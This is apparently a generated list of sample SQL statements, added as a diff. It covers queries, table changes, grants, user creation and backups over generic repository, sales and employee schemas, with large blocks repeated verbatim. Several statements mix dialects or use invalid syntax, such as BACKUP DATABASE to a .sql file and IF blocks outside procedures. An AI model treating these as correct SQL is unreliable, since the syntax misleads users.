+BACKUP DATABASE SalesDB TO 'sales_backup.sql';
+SELECT ProductID, ProductName FROM Products WHERE CategoryID = (SELECT CategoryID FROM Categories WHERE CategoryName = 'Electronics');
+SELECT e.EmployeeID, e.FirstName, e.LastName, d.DepartmentName FROM Employees e INNER JOIN Departments d ON e.DepartmentID = d.DepartmentID;
+SELECT Department, COUNT(*) AS EmployeeCount FROM Employees GROUP BY Department HAVING COUNT(*) > 20;
+SELECT * FROM Repositories;
+SELECT RepositoryID, RepositoryName, Owner FROM Repositories WHERE Language = 'Python';
+SELECT IssueID, Title, Status FROM Issues ORDER BY CreatedDate DESC LIMIT 10;
+SELECT c.CommitID, c.Message, a.AuthorName FROM Commits c JOIN Authors a ON c.AuthorID = a.AuthorID;
+SELECT Language, COUNT(*) AS RepoCount FROM Repositories GROUP BY Language;
+SELECT AVG(Stars) AS AverageStars FROM Repositories WHERE Language = 'JavaScript';
+SELECT Language, MAX(Forks) AS MaxForks FROM Repositories GROUP BY Language HAVING MAX(Forks) > 1000;
+SELECT * FROM PullRequests WHERE Title LIKE '%bug%';
+SELECT PullRequestID, Title, CreatedDate FROM PullRequests WHERE CreatedDate BETWEEN '2022-01-01' AND '2022-12-31';
+INSERT INTO Issues (Title, Description, Status) VALUES ('New Issue', 'Issue description', 'Open');
+UPDATE Repositories SET Stars = Stars + 1 WHERE RepositoryID = 123;
+DELETE FROM Webhooks WHERE CreatedDate < DATE_SUB(CURDATE(), INTERVAL 1 YEAR);
+ALTER TABLE Repositories ADD COLUMN License VARCHAR(50);
+CREATE TABLE Contributors (ContributorID INT PRIMARY KEY AUTO_INCREMENT, ContributorName VARCHAR(50), Contributions INT);
+ALTER TABLE Issues MODIFY COLUMN Title VARCHAR(200);
+DROP TABLE TempData;
+GRANT SELECT, INSERT, UPDATE ON Repositories TO user1;
+REVOKE DELETE ON Issues FROM user2;
+CREATE USER 'new_contributor' IDENTIFIED BY 'secure_password';
+ALTER USER 'admin' RENAME TO 'super_admin';
+BEGIN TRANSACTION; UPDATE Commits SET Verified = TRUE WHERE CommitID = 123; COMMIT;
+CREATE INDEX idx_repo_name ON Repositories(RepositoryName);
+BACKUP DATABASE GitHubDB TO 'backup.sql';
+SELECT RepositoryID, RepositoryName FROM Repositories WHERE RepositoryID IN (SELECT RepositoryID FROM Stars WHERE UserID = 456);
+SELECT r.RepositoryID, r.RepositoryName, c.ContributorName FROM Repositories r LEFT JOIN Contributors c ON r.OwnerID = c.ContributorID WHERE c.ContributorID IS NULL;
+SELECT Language, COUNT(*) AS RepoCount FROM Repositories GROUP BY Language HAVING COUNT(*) > 50;
+WITH ForksCTE AS (SELECT RepositoryID, SUM(Forks) AS TotalForks FROM Repositories GROUP BY RepositoryID) SELECT r.RepositoryName, f.TotalForks FROM Repositories r JOIN ForksCTE f ON r.RepositoryID = f.RepositoryID;
+SELECT RepositoryID, Stars, RANK() OVER (ORDER BY Stars DESC) AS StarRank FROM Repositories;
+WITH RECURSIVE RepoHierarchy AS (SELECT RepositoryID, ParentRepoID, RepositoryName FROM Repositories WHERE ParentRepoID IS NULL UNION ALL SELECT r.RepositoryID, r.ParentRepoID, r.RepositoryName FROM Repositories r INNER JOIN RepoHierarchy h ON r.ParentRepoID = h.RepositoryID) SELECT * FROM RepoHierarchy;
+SELECT JSON_VALUE(RepositoryInfo, '$.Name') AS RepositoryName FROM Repositories WHERE JSON_VALUE(RepositoryInfo, '$.Language') = 'Go';
+SELECT RepositoryName, CAST(RepositoryDetails AS XML).value('(/Repository/Owner)[1]', 'VARCHAR(50)') AS Owner FROM Repositories;
+SELECT * FROM Commits WHERE CommitDate = CURDATE();
+SELECT RepositoryID, SUM(Stars) AS TotalStars FROM Repositories GROUP BY RepositoryID;
+SELECT ContributorID, ContributorName, Contributions FROM Contributors WHERE JoinDate > '2020-01-01';
+SELECT Language, AVG(Stars) AS AverageStars FROM Repositories GROUP BY Language;
+SELECT * FROM Users WHERE Country = 'USA';
+SELECT PullRequestID, Title, RepositoryID FROM PullRequests WHERE Status = 'Open';
+INSERT INTO Contributors (ContributorName, Contributions) VALUES ('Jane Doe', 50);
+UPDATE Repositories SET Forks = Forks + 1 WHERE RepositoryID = 789;
+DELETE FROM Issues WHERE IssueID = 456;
+ALTER TABLE Commits ADD COLUMN Verified BOOLEAN DEFAULT FALSE;
+CREATE TABLE Organizations (OrganizationID INT PRIMARY KEY AUTO_INCREMENT, OrganizationName VARCHAR(50), OwnerID INT);
+ALTER TABLE Repositories DROP COLUMN License;
+DROP TABLE OldData;
+GRANT SELECT, UPDATE ON Issues TO user3;
+REVOKE INSERT ON PullRequests FROM user4;
+CREATE USER 'backup_user' IDENTIFIED BY 'backup_password';
+ALTER USER 'guest' RENAME TO 'visitor';
+BEGIN TRANSACTION; INSERT INTO Stars (RepositoryID, UserID) VALUES (789, 456); COMMIT;
+CREATE INDEX idx_issue_title ON Issues(Title);
+BACKUP DATABASE GitHubDB TO 'github_backup.sql';
+SELECT RepositoryID, RepositoryName FROM Repositories WHERE Language = (SELECT Language FROM Languages WHERE LanguageName = 'Ruby');
+SELECT c.ContributorID, c.ContributorName, r.RepositoryName FROM Contributors c INNER JOIN Repositories r ON c.ContributorID = r.OwnerID;
+SELECT Language, COUNT(*) AS RepoCount FROM Repositories GROUP BY Language HAVING COUNT(*) > 100;
+SELECT * FROM Users;
+SELECT UserID, UserName FROM Users WHERE Active = 1;
+SELECT COUNT(*) FROM Orders;
+SELECT MAX(Price) FROM Products;
+SELECT MIN(Price) FROM Products;
+SELECT AVG(Price) FROM Products;
+SELECT SUM(Quantity) FROM Sales;
+SELECT DISTINCT Country FROM Customers;
+SELECT NOW();
+SELECT CURDATE();
+SELECT UserID, UserName FROM Users ORDER BY UserName;
+SELECT * FROM Orders WHERE OrderDate > '2023-01-01';
+SELECT * FROM Products WHERE Price BETWEEN 10 AND 20;
+SELECT * FROM Customers WHERE Country IN ('USA', 'Canada');
+SELECT * FROM Employees WHERE LastName LIKE 'S%';
+SELECT * FROM Orders WHERE OrderID IS NULL;
+SELECT * FROM Products WHERE Price IS NOT NULL;
+SELECT * FROM Customers WHERE Country = 'USA' AND City = 'New York';
+SELECT * FROM Employees WHERE Department = 'Sales' OR Department = 'Marketing';
+SELECT * FROM Orders WHERE OrderDate >= '2023-01-01' AND OrderDate <= '2023-12-31';
+SELECT * FROM Products WHERE Price > 100 ORDER BY Price DESC;
+SELECT * FROM Customers WHERE Country = 'USA' ORDER BY City;
+SELECT * FROM Employees WHERE HireDate < '2020-01-01';
+SELECT * FROM Orders WHERE CustomerID = 123;
+SELECT * FROM Products WHERE CategoryID = 5;
+SELECT * FROM Employees WHERE ManagerID IS NULL;
+SELECT * FROM Orders WHERE ShippedDate IS NOT NULL;
+SELECT * FROM Products WHERE Stock > 0;
+SELECT * FROM Customers WHERE Email LIKE '%@gmail.com';
+SELECT * FROM Employees WHERE Salary > 50000;
+SELECT * FROM Orders WHERE OrderAmount > 1000;
+SELECT * FROM Products WHERE ProductName LIKE '%Laptop%';
+SELECT * FROM Customers WHERE Phone IS NOT NULL;
+SELECT * FROM Employees WHERE BirthDate BETWEEN '1980-01-01' AND '1990-12-31';
+SELECT * FROM Orders WHERE Status = 'Pending';
+SELECT * FROM Products WHERE Discontinued = 0;
+SELECT * FROM Customers WHERE Country = 'Canada' ORDER BY CustomerName;
+SELECT * FROM Employees WHERE DepartmentID IN (1, 2, 3);
+SELECT * FROM Orders WHERE OrderDate = CURDATE();
+SELECT * FROM Products WHERE Price < 50;
+SELECT * FROM Customers WHERE City = 'Los Angeles';
+SELECT * FROM Employees WHERE JobTitle = 'Manager';
+SELECT * FROM Orders WHERE OrderAmount >= 500;
+SELECT * FROM Products WHERE CategoryID = (SELECT CategoryID FROM Categories WHERE CategoryName = 'Electronics');
+SELECT * FROM Customers WHERE CustomerID IN (SELECT CustomerID FROM Orders WHERE OrderAmount > 1000);
+SELECT * FROM Employees WHERE DepartmentID = (SELECT DepartmentID FROM Departments WHERE DepartmentName = 'HR');
+SELECT * FROM Orders WHERE OrderID NOT IN (SELECT OrderID FROM Shipments);
+SELECT * FROM Products WHERE SupplierID = (SELECT SupplierID FROM Suppliers WHERE SupplierName = 'Acme Corp');
+SELECT * FROM Customers WHERE Country = 'USA' AND City = 'Chicago';
+SELECT * FROM Employees WHERE HireDate > '2022-01-01';
+SELECT * FROM Orders WHERE OrderDate < '2022-01-01';
+CREATE TABLE Organizations (OrganizationID INT PRIMARY KEY AUTO_INCREMENT, OrganizationName VARCHAR(50), OwnerID INT);
+ALTER TABLE Repositories DROP COLUMN License;
+DROP TABLE OldData;
+GRANT SELECT, UPDATE ON Issues TO user3;
+REVOKE INSERT ON PullRequests FROM user4;
+CREATE USER 'backup_user' IDENTIFIED BY 'backup_password';
+ALTER USER 'guest' RENAME TO 'visitor';
+BEGIN TRANSACTION; INSERT INTO Stars (RepositoryID, UserID) VALUES (789, 456); COMMIT;
+CREATE INDEX idx_issue_title ON Issues(Title);
+BACKUP DATABASE GitHubDB TO 'github_backup.sql';
+INSERT INTO Repositories (RepositoryID, RepositoryName, Language) VALUES (101, 'NewRepo', 'Python');
+UPDATE Contributors SET Contributions = Contributions + 1 WHERE ContributorID = 123;
+DELETE FROM Issues WHERE IssueID = 456;
+CREATE VIEW ActiveUsers AS SELECT UserID, UserName FROM Users WHERE Active = 1;
+RENAME TABLE OldTable TO NewTable;
+TRUNCATE TABLE TempData;
+LOCK TABLES Orders WRITE;
+UNLOCK TABLES;
+SET @total_sales = (SELECT SUM(Amount) FROM Sales);
+CALL UpdateStatistics();
+DECLARE @average_price DECIMAL(10, 2);
+SET @average_price = (SELECT AVG(Price) FROM Products);
+IF @average_price > 100 THEN UPDATE Products SET Discount = 0.1 WHERE Price > 100; END IF;
+SELECT * FROM Users;
+SELECT UserID, UserName FROM Users WHERE Active = 1;
+SELECT COUNT(*) FROM Orders;
+SELECT MAX(Price) FROM Products;
+SELECT MIN(Price) FROM Products;
+SELECT AVG(Price) FROM Products;
+SELECT SUM(Quantity) FROM Sales;
+SELECT DISTINCT Country FROM Customers;
+SELECT NOW();
+SELECT CURDATE();
+SELECT UserID, UserName FROM Users ORDER BY UserName;
+SELECT * FROM Orders WHERE OrderDate > '2023-01-01';
+SELECT * FROM Products WHERE Price BETWEEN 10 AND 20;
+SELECT * FROM Customers WHERE Country IN ('USA', 'Canada');
+SELECT * FROM Employees WHERE LastName LIKE 'S%';
+SELECT * FROM Orders WHERE OrderID IS NULL;
+SELECT * FROM Products WHERE Price IS NOT NULL;
+SELECT * FROM Customers WHERE Country = 'USA' AND City = 'New York';
+SELECT * FROM Employees WHERE Department = 'Sales' OR Department = 'Marketing';
+SELECT * FROM Orders WHERE OrderDate >= '2023-01-01' AND OrderDate <= '2023-12-31';
+SELECT * FROM Products WHERE Price > 100 ORDER BY Price DESC;
+SELECT * FROM Customers WHERE Country = 'USA' ORDER BY City;
+SELECT * FROM Employees WHERE HireDate < '2020-01-01';
+SELECT * FROM Orders WHERE CustomerID = 123;
+SELECT * FROM Products WHERE CategoryID = 5;
+SELECT * FROM Employees WHERE ManagerID IS NULL;
+SELECT * FROM Orders WHERE ShippedDate IS NOT NULL;
+SELECT * FROM Products WHERE Stock > 0;
+SELECT * FROM Customers WHERE Email LIKE '%@gmail.com';
+SELECT * FROM Employees WHERE Salary > 50000;
+SELECT * FROM Orders WHERE OrderAmount > 1000;
+SELECT * FROM Products WHERE ProductName LIKE '%Laptop%';
+SELECT * FROM Customers WHERE Phone IS NOT NULL;
+SELECT * FROM Employees WHERE BirthDate BETWEEN '1980-01-01' AND '1990-12-31';
+SELECT * FROM Orders WHERE Status = 'Pending';
+SELECT * FROM Products WHERE Discontinued = 0;
+SELECT * FROM Customers WHERE Country = 'Canada' ORDER BY CustomerName;
+SELECT * FROM Employees WHERE DepartmentID IN (1, 2, 3);
+SELECT * FROM Orders WHERE OrderDate = CURDATE();
+SELECT * FROM Products WHERE Price < 50;
+SELECT * FROM Customers WHERE City = 'Los Angeles';
+SELECT * FROM Employees WHERE JobTitle = 'Manager';
+SELECT * FROM Orders WHERE OrderAmount >= 500;
+SELECT * FROM Products WHERE CategoryID = (SELECT CategoryID FROM Categories WHERE CategoryName = 'Electronics');
+SELECT * FROM Customers WHERE CustomerID IN (SELECT CustomerID FROM Orders WHERE OrderAmount > 1000);
+SELECT * FROM Employees WHERE DepartmentID = (SELECT DepartmentID FROM Departments WHERE DepartmentName = 'HR');
+SELECT * FROM Orders WHERE OrderID NOT IN (SELECT OrderID FROM Shipments);
+SELECT * FROM Products WHERE SupplierID = (SELECT SupplierID FROM Suppliers WHERE SupplierName = 'Acme Corp');
+SELECT * FROM Customers WHERE Country = 'USA' AND City = 'Chicago';
+SELECT * FROM Employees WHERE HireDate > '2022-01-01';
+SELECT * FROM Orders WHERE OrderDate < '2022-01-01';
+INSERT INTO Repositories (RepositoryID, RepositoryName, Language) VALUES (101, 'NewRepo', 'Python');
+UPDATE Contributors SET Contributions = Contributions + 1 WHERE ContributorID = 123;
+DELETE FROM Issues WHERE IssueID = 456;
+TRUNCATE TABLE TempData;
+CREATE TABLE Organizations (OrganizationID INT PRIMARY KEY AUTO_INCREMENT, OrganizationName VARCHAR(50), OwnerID INT);
+ALTER TABLE Repositories DROP COLUMN License;
+DROP TABLE OldData;
+CREATE VIEW ActiveUsers AS SELECT UserID, UserName FROM Users WHERE Active = 1;
+RENAME TABLE OldTable TO NewTable;
+CREATE INDEX idx_issue_title ON Issues(Title);
+GRANT SELECT, UPDATE ON Issues TO user3;
+REVOKE INSERT ON PullRequests FROM user4;
+CREATE USER 'backup_user' IDENTIFIED BY 'backup_password';
+ALTER USER 'guest' RENAME TO 'visitor';
+BEGIN TRANSACTION; INSERT INTO Stars (RepositoryID, UserID) VALUES (789, 456); COMMIT;
+LOCK TABLES Orders WRITE;
+UNLOCK TABLES;
+SELECT Orders.OrderID, Customers.CustomerName FROM Orders INNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;
+SELECT Employees.EmployeeName, Departments.DepartmentName FROM Employees LEFT JOIN Departments ON Employees.DepartmentID = Departments.DepartmentID;
+SELECT Products.ProductName, Suppliers.SupplierName FROM Products RIGHT JOIN Suppliers ON Products.SupplierID = Suppliers.SupplierID;
+SELECT Orders.OrderID, Customers.CustomerName FROM Orders FULL OUTER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;
+SELECT ProductName FROM Products WHERE CategoryID = (SELECT CategoryID FROM Categories WHERE CategoryName = 'Electronics');
+SELECT CustomerName FROM Customers WHERE CustomerID IN (SELECT CustomerID FROM Orders WHERE OrderAmount > 1000);
+SELECT COUNT(*) FROM Orders;
+SELECT AVG(Price) FROM Products;
+SELECT SUM(Quantity) FROM Sales;
+SELECT MAX(Price) FROM Products;
+SELECT MIN(Price) FROM Products;
+SELECT Country, COUNT(*) FROM Customers GROUP BY Country;
+SELECT DepartmentID, AVG(Salary) FROM Employees GROUP BY DepartmentID HAVING AVG(Salary) > 50000;
+SELECT UserID, UserName FROM Users WHERE Active = 1 UNION SELECT UserID, UserName FROM ArchivedUsers WHERE Active = 1;
+SELECT ProductName, CASE WHEN Price > 100 THEN 'Expensive' ELSE 'Affordable' END AS PriceCategory FROM Products;
+CREATE TABLE Projects (ProjectID INT PRIMARY KEY, ProjectName VARCHAR(100), StartDate DATE, EndDate DATE);
+INSERT INTO Projects (ProjectID, ProjectName, StartDate, EndDate) VALUES (1, 'Project Alpha', '2023-01-01', '2023-12-31');
+UPDATE Projects SET EndDate = '2024-12-31' WHERE ProjectID = 1;
+DELETE FROM Projects WHERE ProjectID = 1;
+CREATE INDEX idx_project_name ON Projects(ProjectName);
+DROP TABLE Projects;
+ALTER TABLE Projects ADD COLUMN Budget DECIMAL(10, 2);
+ALTER TABLE Projects DROP COLUMN Budget;
+CREATE VIEW ActiveProjects AS SELECT ProjectID, ProjectName FROM Projects WHERE EndDate > CURDATE();
+RENAME TABLE Projects TO ProjectDetails;
+TRUNCATE TABLE Projects;
+GRANT SELECT, INSERT, UPDATE ON Projects TO user1;
+REVOKE DELETE ON Projects FROM user1;
+CREATE USER 'project_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'project_manager' RENAME TO 'pm_user';
+BEGIN TRANSACTION; INSERT INTO Projects (ProjectID, ProjectName, StartDate, EndDate) VALUES (2, 'Project Beta', '2023-06-01', '2023-12-31'); COMMIT;
+LOCK TABLES Projects WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE ProjectDB TO 'project_backup.sql';
+CALL UpdateProjectStatus();
+SET @total_budget = (SELECT SUM(Budget) FROM Projects);
+DECLARE @average_duration INT;
+SET @average_duration = (SELECT AVG(DATEDIFF(EndDate, StartDate)) FROM Projects);
+IF @average_duration > 365 THEN UPDATE Projects SET Status = 'Long-term' WHERE DATEDIFF(EndDate, StartDate) > 365; END IF;
+INSERT INTO Customers (CustomerID, CustomerName, ContactName, Country) VALUES (1, 'Alfreds Futterkiste', 'Maria Anders', 'Germany');
+UPDATE Customers SET ContactName = 'Alfred Schmidt', City = 'Frankfurt' WHERE CustomerID = 1;
+DELETE FROM Customers WHERE CustomerID = 1;
+CREATE TABLE Orders (OrderID INT PRIMARY KEY, OrderNumber INT, CustomerID INT);
+ALTER TABLE Orders ADD COLUMN OrderDate DATE;
+DROP TABLE Orders;
+CREATE VIEW CustomerOrders AS SELECT Customers.CustomerName, Orders.OrderNumber FROM Customers JOIN Orders ON Customers.CustomerID = Orders.CustomerID;
+RENAME TABLE Orders TO OrderDetails;
+TRUNCATE TABLE Orders;
+GRANT SELECT, INSERT, UPDATE ON Orders TO user2;
+REVOKE DELETE ON Orders FROM user2;
+CREATE USER 'order_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'order_manager' RENAME TO 'om_user';
+BEGIN TRANSACTION; INSERT INTO Orders (OrderID, OrderNumber, CustomerID) VALUES (1, 12345, 1); COMMIT;
+LOCK TABLES Orders WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE OrderDB TO 'order_backup.sql';
+CALL UpdateOrderStatus();
+SET @total_orders = (SELECT COUNT(*) FROM Orders);
+DECLARE @average_order_value DECIMAL(10, 2);
+SET @average_order_value = (SELECT AVG(OrderValue) FROM Orders);
+IF @average_order_value > 1000 THEN UPDATE Orders SET Priority = 'High' WHERE OrderValue > 1000; END IF;
+CREATE TABLE Products (ProductID INT PRIMARY KEY, ProductName VARCHAR(100), SupplierID INT, CategoryID INT, UnitPrice DECIMAL(10, 2), UnitsInStock INT);
+INSERT INTO Products (ProductID, ProductName, SupplierID, CategoryID, UnitPrice, UnitsInStock) VALUES (1, 'Chai', 1, 1, 18.00, 39);
+UPDATE Products SET UnitPrice = 19.00 WHERE ProductID = 1;
+DELETE FROM Products WHERE ProductID = 1;
+CREATE INDEX idx_product_name ON Products(ProductName);
+DROP TABLE Products;
+ALTER TABLE Products ADD COLUMN Discontinued BIT;
+ALTER TABLE Products DROP COLUMN Discontinued;
+CREATE VIEW ActiveProducts AS SELECT ProductID, ProductName FROM Products WHERE Discontinued = 0;
+RENAME TABLE Products TO ProductDetails;
+TRUNCATE TABLE Products;
+GRANT SELECT, INSERT, UPDATE ON Products TO user3;
+REVOKE DELETE ON Products FROM user3;
+CREATE USER 'product_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'product_manager' RENAME TO 'pm_user';
+BEGIN TRANSACTION; INSERT INTO Products (ProductID, ProductName, SupplierID, CategoryID, UnitPrice, UnitsInStock) VALUES (2, 'Chang', 1, 1, 19.00, 17); COMMIT;
+LOCK TABLES Products WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE ProductDB TO 'product_backup.sql';
+CALL UpdateProductStatus();
+SET @total_stock = (SELECT SUM(UnitsInStock) FROM Products);
+DECLARE @average_price DECIMAL(10, 2);
+SET @average_price = (SELECT AVG(UnitPrice) FROM Products);
+IF @average_price > 20 THEN UPDATE Products SET Discount = 0.1 WHERE UnitPrice > 20; END IF;
+CREATE TABLE Suppliers (SupplierID INT PRIMARY KEY, SupplierName VARCHAR(100), ContactName VARCHAR(100), Country VARCHAR(50));
+INSERT INTO Suppliers (SupplierID, SupplierName, ContactName, Country) VALUES (1, 'Exotic Liquids', 'Charlotte Cooper', 'UK');
+UPDATE Suppliers SET ContactName = 'Charlotte Brown' WHERE SupplierID = 1;
+DELETE FROM Suppliers WHERE SupplierID = 1;
+CREATE INDEX idx_supplier_name ON Suppliers(SupplierName);
+DROP TABLE Suppliers;
+ALTER TABLE Suppliers ADD COLUMN Phone VARCHAR(20);
+ALTER TABLE Suppliers DROP COLUMN Phone;
+CREATE VIEW ActiveSuppliers AS SELECT SupplierID, SupplierName FROM Suppliers WHERE Country = 'UK';
+RENAME TABLE Suppliers TO SupplierDetails;
+TRUNCATE TABLE Suppliers;
+GRANT SELECT, INSERT, UPDATE ON Suppliers TO user4;
+REVOKE DELETE ON Suppliers FROM user4;
+CREATE USER 'supplier_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'supplier_manager' RENAME TO 'sm_user';
+BEGIN TRANSACTION; INSERT INTO Suppliers (SupplierID, SupplierName, ContactName, Country) VALUES (2, 'New Orleans Cajun Delights', 'Shelley Burke', 'USA'); COMMIT;
+LOCK TABLES Suppliers WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE SupplierDB TO 'supplier_backup.sql';
+CALL UpdateSupplierStatus();
+SET @total_suppliers = (SELECT COUNT(*) FROM Suppliers);
+DECLARE @average_supplier_rating DECIMAL(10, 2);
+SET @average_supplier_rating = (SELECT AVG(Rating) FROM SupplierRatings);
+IF @average_supplier_rating > 4 THEN UPDATE Suppliers SET Preferred = 1 WHERE Rating > 4; END IF;
+CREATE TABLE Categories (CategoryID INT PRIMARY KEY, CategoryName VARCHAR(100), Description TEXT);
+INSERT INTO Categories (CategoryID, CategoryName, Description) VALUES (1, 'Beverages', 'Soft drinks, coffees, teas, beers, and ales');
+UPDATE Categories SET Description = 'Soft drinks, coffees, teas, beers, ales, and more' WHERE CategoryID = 1;
+DELETE FROM Categories WHERE CategoryID = 1;
+CREATE INDEX idx_category_name ON Categories(CategoryName);
+DROP TABLE Categories;
+ALTER TABLE Categories ADD COLUMN Picture BLOB;
+ALTER TABLE Categories DROP COLUMN Picture;
+CREATE VIEW ActiveCategories AS SELECT CategoryID, CategoryName FROM Categories WHERE CategoryName LIKE 'B%';
+RENAME TABLE Categories TO CategoryDetails;
+TRUNCATE TABLE Categories;
+GRANT SELECT, INSERT, UPDATE ON Categories TO user5;
+REVOKE DELETE ON Categories FROM user5;
+CREATE USER 'category_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'category_manager' RENAME TO 'cm_user';
+BEGIN TRANSACTION; INSERT INTO Categories (CategoryID, CategoryName, Description) VALUES (2, 'Condiments', 'Sweet and savory sauces, relishes, spreads, and seasonings'); COMMIT;
+LOCK TABLES Categories WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE CategoryDB TO 'category_backup.sql';
+CALL UpdateCategoryStatus();
+SET @total_categories = (SELECT COUNT(*) FROM Categories);
+DECLARE @average_category_size INT;
+SET @average_category_size = (SELECT AVG(LENGTH(Description)) FROM Categories);
+IF @average_category_size > 100 THEN UPDATE Categories SET Popular = 1 WHERE LENGTH(Description) > 100; END IF;
+CREATE TABLE Employees (EmployeeID INT PRIMARY KEY, FirstName VARCHAR(50), LastName VARCHAR(50), BirthDate DATE, HireDate DATE);
+INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, HireDate) VALUES (1, 'John', 'Doe', '1980-01-01', '2020-01-01');
+UPDATE Employees SET LastName = 'Smith' WHERE EmployeeID = 1;
+DELETE FROM Employees WHERE EmployeeID = 1;
+CREATE INDEX idx_employee_name ON Employees(LastName);
+DROP TABLE Employees;
+ALTER TABLE Employees ADD COLUMN Salary DECIMAL(10, 2);
+ALTER TABLE Employees DROP COLUMN Salary;
+CREATE VIEW ActiveEmployees AS SELECT EmployeeID, FirstName, LastName FROM Employees WHERE HireDate > '2020-01-01';
+RENAME TABLE Employees TO EmployeeDetails;
+TRUNCATE TABLE Employees;
+GRANT SELECT, INSERT, UPDATE ON Employees TO user6;
+REVOKE DELETE ON Employees FROM user6;
+CREATE USER 'employee_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'employee_manager' RENAME TO 'em_user';
+BEGIN TRANSACTION; INSERT INTO Employees (EmployeeID, FirstName, LastName, BirthDate, HireDate) VALUES (2, 'Jane', 'Doe', '1990-01-01', '2021-01-01'); COMMIT;
+LOCK TABLES Employees WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE EmployeeDB TO 'employee_backup.sql';
+CALL UpdateEmployeeStatus();
+SET @total_employees = (SELECT COUNT(*) FROM Employees);
+DECLARE @average_salary DECIMAL(10, 2);
+SET @average_salary = (SELECT AVG(Salary) FROM Employees);
+IF @average_salary > 50000 THEN UPDATE Employees SET Bonus = 5000 WHERE Salary > 50000; END IF;
+CREATE TABLE Departments (DepartmentID INT PRIMARY KEY, DepartmentName VARCHAR(100), ManagerID INT);
+INSERT INTO Departments (DepartmentID, DepartmentName, ManagerID) VALUES (1, 'HR', 1);
+UPDATE Departments SET DepartmentName = 'Human Resources' WHERE DepartmentID = 1;
+DELETE FROM Departments WHERE DepartmentID = 1;
+CREATE INDEX idx_department_name ON Departments(DepartmentName);
+DROP TABLE Departments;
+ALTER TABLE Departments ADD COLUMN Location VARCHAR(100);
+ALTER TABLE Departments DROP COLUMN Location;
+CREATE VIEW ActiveDepartments AS SELECT DepartmentID, DepartmentName FROM Departments WHERE ManagerID IS NOT NULL;
+RENAME TABLE Departments TO DepartmentDetails;
+TRUNCATE TABLE Departments;
+GRANT SELECT, INSERT, UPDATE ON Departments TO user7;
+REVOKE DELETE ON Departments FROM user7;
+CREATE USER 'department_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'department_manager' RENAME TO 'dm_user';
+BEGIN TRANSACTION; INSERT INTO Departments (DepartmentID, DepartmentName, ManagerID) VALUES (2, 'IT', 2); COMMIT;
+LOCK TABLES Departments WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE DepartmentDB TO 'department_backup.sql';
+CALL UpdateDepartmentStatus();
+SET @total_departments = (SELECT COUNT(*) FROM Departments);
+DECLARE @average_department_size INT;
+SET @average_department_size = (SELECT AVG(EmployeeCount) FROM DepartmentStats);
+IF @average_department_size > 50 THEN UPDATE Departments SET Large = 1 WHERE EmployeeCount > 50; END IF;
+CREATE TABLE Sales (SaleID INT PRIMARY KEY, ProductID INT, Quantity INT, SaleDate DATE);
+INSERT INTO Sales (SaleID, ProductID, Quantity, SaleDate) VALUES (1, 1, 10, '2023-01-01');
+UPDATE Sales SET Quantity = 15 WHERE SaleID = 1;
+DELETE FROM Sales WHERE SaleID = 1;
+CREATE INDEX idx_sale_date ON Sales(SaleDate);
+DROP TABLE Sales;
+ALTER TABLE Sales ADD COLUMN Discount DECIMAL(5, 2);
+ALTER TABLE Sales DROP COLUMN Discount;
+CREATE VIEW RecentSales AS SELECT SaleID, ProductID, Quantity FROM Sales WHERE SaleDate > '2023-01-01';
+RENAME TABLE Sales TO SaleDetails;
+TRUNCATE TABLE Sales;
+GRANT SELECT, INSERT, UPDATE ON Sales TO user8;
+REVOKE DELETE ON Sales FROM user8;
+CREATE USER 'sales_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'sales_manager' RENAME TO 'sm_user';
+BEGIN TRANSACTION; INSERT INTO Sales (SaleID, ProductID, Quantity, SaleDate) VALUES (2, 2, 20, '2023-02-01'); COMMIT;
+LOCK TABLES Sales WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE SalesDB TO 'sales_backup.sql';
+CALL UpdateSalesStatus();
+SET @total_sales = (SELECT COUNT(*) FROM Sales);
+DECLARE @average_sale_value DECIMAL(10, 2);
+SET @average_sale_value = (SELECT AVG(TotalValue) FROM Sales);
+IF @average_sale_value > 1000 THEN UPDATE Sales SET HighValue = 1 WHERE TotalValue > 1000; END IF;
+CREATE TABLE Inventory (InventoryID INT PRIMARY KEY, ProductID INT, Quantity INT, LastUpdated DATE);
+INSERT INTO Inventory (InventoryID, ProductID, Quantity, LastUpdated) VALUES (1, 1, 100, '2023-01-01');
+UPDATE Inventory SET Quantity = 150 WHERE InventoryID = 1;
+DELETE FROM Inventory WHERE InventoryID = 1;
+CREATE INDEX idx_inventory_product ON Inventory(ProductID);
+DROP TABLE Inventory;
+ALTER TABLE Inventory ADD COLUMN Location VARCHAR(100);
+ALTER TABLE Inventory DROP COLUMN Location;
+CREATE VIEW CurrentInventory AS SELECT InventoryID, ProductID, Quantity FROM Inventory WHERE Quantity > 0;
+RENAME TABLE Inventory TO InventoryDetails;
+TRUNCATE TABLE Inventory;
+GRANT SELECT, INSERT, UPDATE ON Inventory TO user9;
+REVOKE DELETE ON Inventory FROM user9;
+CREATE USER 'inventory_manager' IDENTIFIED BY 'securepassword';
+ALTER USER 'inventory_manager' RENAME TO 'im_user';
+BEGIN TRANSACTION; INSERT INTO Inventory (InventoryID, ProductID, Quantity, LastUpdated) VALUES (2, 2, 200, '2023-02-01'); COMMIT;
+LOCK TABLES Inventory WRITE;
+UNLOCK TABLES;
+BACKUP DATABASE InventoryDB TO 'inventory_backup.sql';
+CALL UpdateInventoryStatus();
+SET @total_inventory = (SELECT COUNT(*) FROM Inventory);
+DECLARE @average_inventory_level INT;
+SET @average_inventory_level = (SELECT AVG(Quantity) FROM Inventory);
+IF @average_inventory_level > 100 THEN UPDATE Inventory SET Overstocked = 1 WHERE Quantity > 100; END IF;
+CREATE TABLE Orders (OrderID INT PRIMARY KEY, CustomerID INT, OrderDate DATE, Status VARCHAR(50));
